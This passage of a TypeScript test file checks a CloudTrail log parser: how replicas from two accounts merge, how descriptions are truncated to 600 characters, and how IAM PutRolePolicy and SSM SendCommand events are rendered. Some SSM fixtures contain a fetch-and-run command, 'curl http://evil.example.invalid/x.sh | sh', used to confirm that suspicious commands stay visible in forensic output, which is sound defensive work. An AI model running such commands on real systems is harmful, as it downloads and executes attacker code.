      requestParameters: { bucketName: "b", key: "k" },
    });
    const a = parseCloudTrail(envelope(owner, caller)).events[0];
    const b = parseCloudTrail(envelope(caller, owner)).events[0];
    for (const e of [a, b]) {
      expect(e.canonical?.cloud).toMatchObject({ accountId: ACCT, recipientAccountId: OTHER });
      expect(e.description).toContain("IdentityCenterUser key cred-4 (temporary)");
      // The merged envelope conforms, and the supplemented caller account traces to the replica
      // that carried it.
      expect(canonicalConformanceIssues(e.canonical)).toEqual([]);
      const ownerPointer = e.canonical?.evidence.rawRecords.find((p) => p.recordId === "owner")!.locator;
      expect(e.canonical?.fieldProvenance["cloud.accountId"]).toMatchObject({
        origin: "raw",
        rawFields: ["userIdentity.accountId"],
        recordLocators: [ownerPointer],
      });
    }
  });
  it("the cross-account notice survives a kept description that fills 600 characters", () => {
    const shared = "shared-long";
    const longDoc = JSON.stringify({
      Version: "2012-10-17",
      Statement: [
        {
          Effect: "Allow",
          Action: Array.from({ length: 200 }, (_, i) => `svc${i}:Action${i}`),
          Resource: "*",
          Condition: { Bool: { "aws:MultiFactorAuthPresent": "true" } },
        },
      ],
    });
    const iamRecord = (over: object) =>
      record({
        eventName: "PutRolePolicy",
        eventSource: "iam.amazonaws.com",
        readOnly: false,
        sharedEventID: shared,
        requestParameters: {
          roleName: "r".repeat(300),
          policyName: "n".repeat(300),
          policyDocument: longDoc,
        },
        ...over,
      });
    const r = parseCloudTrail(
      envelope(
        iamRecord({
          userIdentity: { type: "AWSAccount", principalId: "AIDAEXAMPLE", accountId: ACCT },
          recipientAccountId: OTHER,
          eventID: "owner",
        }),
        iamRecord({ userIdentity: assumedRole(), recipientAccountId: ACCT, eventID: "caller" }),
      ),
    );
    expect(r.events).toHaveLength(1);
    const d = r.events[0].description;
    expect(d.length).toBeLessThanOrEqual(600);
    // The notice is a reserved slot right after the head; the qualifier tail survives whole.
    expect(d).toMatch(new RegExp(`^AWS PutRolePolicy \\(iam\\) by [^\\[]+ \\[also in account ${OTHER}\\] `));
    expect(d).toMatch(/effective access depends on controls not in this record$/);
    // Both records are represented, none dropped.
    expect(r.dropped).toBe(0);
    expect(r.kept).toBe(1);
  });
  it("the cross-account notice and the full SSM caveat both survive a maximal SendCommand replica pair", () => {
    const shared = "shared-ssm";
    const ssmRecord = (over: object) =>
      record({
        eventName: "SendCommand",
        eventSource: "ssm.amazonaws.com",
        readOnly: false,
        sharedEventID: shared,
        userAgent: "u".repeat(80),
        requestParameters: {
          documentName: "AWS-RunShellScript",
          instanceIds: Array.from(
            { length: 50 },
            (_, i) => `i-0abc${String(i).padStart(3, "0")}${"x".repeat(10)}`,
          ),
          parameters: { commands: [`curl ${"u".repeat(300)} | sh`] },
        },
        responseElements: { command: { commandId: "c".repeat(36), documentVersion: "3", status: "Pending" } },
        ...over,
      });
    const r = parseCloudTrail(
      envelope(
        ssmRecord({
          userIdentity: { type: "AWSAccount", principalId: "AIDAEXAMPLE", accountId: ACCT },
          recipientAccountId: OTHER,
          eventID: "owner",
        }),
        ssmRecord({ userIdentity: assumedRole(), recipientAccountId: ACCT, eventID: "caller" }),
      ),
    );
    expect(r.events).toHaveLength(1);
    const d = r.events[0].description;
    expect(d.length).toBeLessThanOrEqual(600);
    expect(d).toContain(`[also in account ${OTHER}]`);
    // The whole caveat — the middle clause included — ends the row.
    expect(d).toMatch(
      /— The result is not in CloudTrail \(Pending at the call\); runs as the SSM agent's configured user — guest evidence decides\.$/,
    );
    expect(d).toContain("[AWS-RunShellScript@3] cccccccccccccccccccccccccccccccccccc Pending: requested");
    expect(r.dropped).toBe(0);
  });
  it("a reused session name under two access keys is two rows", () => {
    const r = parseCloudTrail(
      envelope(
        record({
          eventName: "ListBuckets",
          eventSource: "s3.amazonaws.com",
          readOnly: true,
          userIdentity: assumedRole({ accessKeyId: "ASIAEXAMPLEKEY000001" }),
          eventID: "e1",
        }),
        record({
          eventName: "ListBuckets",
          eventSource: "s3.amazonaws.com",
          readOnly: true,
          userIdentity: assumedRole({ accessKeyId: "ASIAEXAMPLEKEY000002" }),
          eventID: "e2",
        }),
      ),
    );
    expect(r.events).toHaveLength(2);
  });
  it("the identity yields to the evidence: a maximal IAM row and a maximal SSM row keep their mandatory slots", () => {
    const longIdentity = assumedRole({
      principalId: `AROAEXAMPLEID:${"s".repeat(300)}`,
      sessionContext: {
        sessionIssuer: {
          type: "Role",
          principalId: "AROAEXAMPLEID",
          arn: `arn:aws:iam::${ACCT}:role/${"r".repeat(300)}`,
          accountId: ACCT,
          userName: "x",
        },
        attributes: { creationDate: "2024-05-01T09:00:00Z", mfaAuthenticated: "false" },
        sourceIdentity: "i".repeat(200),
      },
    });
    const iam = parseCloudTrail(
      envelope(
        record({
          eventName: "PutRolePolicy",
          eventSource: "iam.amazonaws.com",
          readOnly: false,
          userIdentity: longIdentity,
          recipientAccountId: ACCT,
          errorCode: "AccessDenied",
          requestParameters: {
            roleName: "r".repeat(300),
            policyName: "n".repeat(300),
            policyDocument: JSON.stringify({
              Version: "2012-10-17",
              Statement: [
                {
                  Effect: "Allow",
                  Action: "*",
                  Resource: "*",
                  Condition: { Bool: { "aws:MultiFactorAuthPresent": "true" } },
                },
              ],
            }),
          },
        }),
      ),
    ).events[0].description;
    expect(iam.length).toBeLessThanOrEqual(600);
    expect(iam).toContain("attempted to replace inline policy — denied (AccessDenied)");
    expect(iam).toContain("role=rrrr");
    expect(iam).toContain("previous document not in this record");
    expect(iam).toContain("effective access depends on controls not in this record");
    expect(iam).toMatch(/AssumedRole key ASIAEXAMPLEKEY000001/);
    const ssm = parseCloudTrail(
      envelope(
        record({
          eventName: "SendCommand",
          eventSource: "ssm.amazonaws.com",
          readOnly: false,
          userIdentity: longIdentity,
          eventID: "evt-ssm",
          requestParameters: {
            documentName: "AWS-RunShellScript",
            instanceIds: ["i-0abc123def456789a"],
            parameters: { commands: ["curl http://evil.example.invalid/x.sh | sh"] },
          },
          responseElements: {
            command: {
              commandId: "cmd-1111",
              documentName: "AWS-RunShellScript",
              documentVersion: "3",
              status: "Pending",
            },
          },
        }),
      ),
    ).events[0].description;
    expect(ssm.length).toBeLessThanOrEqual(600);
    expect(ssm).toContain("[AWS-RunShellScript@3] cmd-1111 Pending: requested → i-0abc123def456789a");
    expect(ssm).toContain('cmd: "curl http://evil.example.invalid/x.sh | sh"');
    expect(ssm).toMatch(/AssumedRole key ASIAEXAMPLEKEY000001/);
  });
});
